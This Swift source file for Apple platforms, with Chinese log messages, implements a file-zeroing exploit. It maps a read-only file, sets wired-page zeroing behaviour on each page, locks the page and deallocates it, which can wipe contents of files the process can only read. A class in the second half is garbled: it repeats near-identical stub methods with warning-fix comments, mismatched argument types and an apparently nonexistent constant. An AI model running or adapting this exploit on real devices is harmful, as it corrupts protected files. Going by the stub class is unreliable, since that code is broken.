//
//  FileZeroExploit.swift
//  X
//
//  Created by pxx917144686 on 2025/05/15.
//

import Foundation
import MachO


@_silgen_name("mach_vm_behavior_set")
private func mach_vm_behavior_set(_ target_task: mach_port_t, _ address: UnsafeMutableRawPointer?, _ size: mach_vm_size_t, _ new_behavior: vm_behavior_t) -> kern_return_t

@_silgen_name("mach_vm_deallocate")
private func mach_vm_deallocate(_ target_task: mach_port_t, _ address: UnsafeMutableRawPointer?, _ size: mach_vm_size_t) -> kern_return_t

private func zero_single_page(_ page_address: UnsafeMutableRawPointer?) -> Bool {
    var kr = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_ZERO_WIRED_PAGES)
    guard kr == KERN_SUCCESS else {
        print("SwiftExploit: 设置VM_BEHAVIOR_ZERO_WIRED_PAGES失败: \(String(cString: mach_error_string(kr)))")
        return false
    }

    guard mlock(page_address, Int(vm_page_size)) == 0 else {
        perror("SwiftExploit: mlock失败")
        mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        return false
    }
    print("SwiftExploit: mlock成功")

    kr = mach_vm_deallocate(mach_task_self_, page_address, mach_vm_size_t(vm_page_size))
    guard kr == KERN_SUCCESS else {
        print("SwiftExploit: vm_deallocate失败: \(String(cString: mach_error_string(kr)))")
        munlock(page_address, Int(vm_page_size))
        mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        return false
    }
    print("SwiftExploit: 在解锁前已删除映射条目")
    return true
}

@discardableResult
func applySwiftFileZeroExploit(filePath: String, zeroAllPages: Bool = false) -> Int32 {
    let fd = open(filePath, O_RDONLY)
    guard fd != -1 else {
        perror("SwiftExploit: 打开文件\(filePath)失败")
        return 1
    }
    defer { close(fd) }

    var st = stat()
    guard fstat(fd, &st) == 0 else {
        perror("SwiftExploit: 对文件\(filePath)执行fstat失败")
        return -1
    }

    guard st.st_size > 0 else {
        print("SwiftExploit: 文件\(filePath)为空，无需清零。")
        return 0
    }
    
    let mapped_length = Int(st.st_size)
    let ro_addr = mmap(nil, mapped_length, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0)
    
    guard ro_addr != MAP_FAILED else {
        perror("SwiftExploit: 文件\(filePath)的mmap失败")
        return 2 
    }
    defer { munmap(ro_addr, mapped_length) }

    let numberOfPagesToProcess: UInt
    if zeroAllPages {
        numberOfPagesToProcess = (UInt(st.st_size) + UInt(vm_page_size) - 1) / UInt(vm_page_size)
        print("SwiftExploit: 正在清零文件\(filePath)的所有\(numberOfPagesToProcess)页。")
    } else {
        numberOfPagesToProcess = st.st_size > 0 ? 1 : 0
        if numberOfPagesToProcess == 1 {
             print("SwiftExploit: 正在清零文件\(filePath)的第一页。")
        }
    }
    
    if numberOfPagesToProcess == 0 && st.st_size > 0 {
         print("SwiftExploit: 为非空文件计算出0页。这是意外情况。")
         return -2
    }


    for i in 0..<numberOfPagesToProcess {
        guard let page_to_zero = ro_addr?.advanced(by: Int(UInt(vm_page_size) * i)) else {
            print("SwiftExploit: 无法前进到文件\(filePath)的第\(i)页。ro_addr可能为空。")
            return 3
        }
        print("SwiftExploit: 正在清零文件\(filePath)中位于\(page_to_zero)的第\(i)页")
        
        guard zero_single_page(page_to_zero) else {
            print("SwiftExploit: 文件\(filePath)中第\(i)页的zero_single_page失败。")
            return 3
        }
    }

    print("SwiftExploit: 成功处理文件\(filePath)的页面。")
    return 0
}

class FileZeroExploit {
    private var page_address: UInt64 = 0
    
    // 应用零填充漏洞
    func applyZeroFill(toPage pageAddress: UInt64) -> Bool {
        // 调用mach_vm_behavior_set函数并处理返回值
        let result = mach_vm_behavior_set(
            mach_task_self_,
            pageAddress,
            mach_vm_size_t(vm_page_size),
            VM_BEHAVIOR_ZERO_WIRED
        )
        
        return result == KERN_SUCCESS
    }
    
    // 重置页面行为
    func resetPageBehavior(pageAddress: UInt64) -> Bool {
        // 明确使用Darwin模块的VM_BEHAVIOR_DEFAULT以避免歧义
        let result = mach_vm_behavior_set(
            mach_task_self_,
            pageAddress,
            mach_vm_size_t(vm_page_size),
            Darwin.VM_BEHAVIOR_DEFAULT
        )
        
        return result == KERN_SUCCESS
    }
    
    // 修复第134行没有使用的behavior变量
    func someFunction() {
        // 修改为使用下划线忽略未使用的变量
        let _ = Darwin.VM_BEHAVIOR_DEFAULT
        // 或完全删除这行代码
    }
    
    // 处理未使用的mach_vm_behavior_set返回值
    // 方法1：使用@discardableResult
    @discardableResult
    func setVMBehavior() -> kern_return_t {
        let addressValue = UInt64(bitPattern: page_address)
        return mach_vm_behavior_set(mach_task_self_, addressValue, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
    }

    // 方法2：检查返回值
    func anotherSetVMBehaviorMethod() {
        let result = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        if result != KERN_SUCCESS {
            print("Failed to set VM behavior: \(result)")
        }
    }

    // 方法3：明确忽略返回值
    func yetAnotherSetVMBehaviorMethod() {
        _ = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
    }
    
    func exploit() {
        // 实现代码...
        
        // 修复未使用的返回值
        let result = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        if result != KERN_SUCCESS {
            print("设置VM行为失败: \(result)")
        }
        
        // 其他代码...
        
        // 修复第27行中未使用的返回值警告
        _ = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
    }
    
    // 修复其他使用page_address的方法
    func fixedMethodOne() {
        let result = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        // 使用result...
    }
    
    func fixedMethodTwo() {
        _ = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
    }
    
    // 安全处理不使用返回值的情况
    func safeSetVMBehavior() {
        _ = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
    }
    
    func someOtherMethod() {
        _ = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        // 其他代码...
    }
    
    func anotherMethod() {
        _ = mach_vm_behavior_set(mach_task_self_, page_address, mach_vm_size_t(vm_page_size), VM_BEHAVIOR_DEFAULT)
        // 其他代码...
    }
}
